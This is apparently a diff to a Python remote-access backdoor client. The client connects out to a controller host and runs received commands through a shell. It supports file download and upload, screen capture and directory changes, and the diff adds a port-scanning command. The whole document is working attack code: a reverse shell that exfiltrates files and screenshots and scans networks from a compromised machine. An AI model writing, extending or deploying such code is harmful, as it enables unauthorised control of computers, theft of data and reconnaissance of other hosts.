@@ -76,6 +76,31 @@ def change_working_directory(s, path):
     s.send(ret_str)
 
 
+def scan_port(s, args):
+    arg_list = args.split (' ')
+    if len(arg_list) == 1:
+        host = arg_list[0]
+        port_list = range(1, 65536)
+    else:
+        host = arg_list[0]
+        port_list = arg_list[1].split(',')
+
+    scan_result = ''
+    try:
+        for port in port_list:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            result = sock.connect_ex((host, int(port)))
+            if result == 0:
+                scan_result += '[+] Port ' + port + ' is open.\n'
+            else:
+                scan_result += '[-] Port ' + port + ' is closed or the host is not reachable.\n'
+            sock.close()
+    except:
+        pass
+
+    s.send(scan_result)
+
+
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((sys.argv[0], int(sys.argv[1])))
@@ -89,17 +114,19 @@ def connect():
         else:
             args = ''
 
-        if 'exit' in action:
+        if 'exit' == action:
             s.close()
             break
-        elif 'download' in action:
+        elif 'download' == action:
             send_file(s, args)
-        elif 'upload' in action:
+        elif 'upload' == action:
             receive_file(s, args)
-        elif 'screencap' in action:
+        elif 'screencap' == action:
             screen_capture(s)
-        elif 'cd' in action:
+        elif 'cd' == action:
             change_working_directory(s, args)
+        elif 'portscan' == action:
+            scan_port(s, args)
         else:
             cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             s.send(cmd.stdout.read())
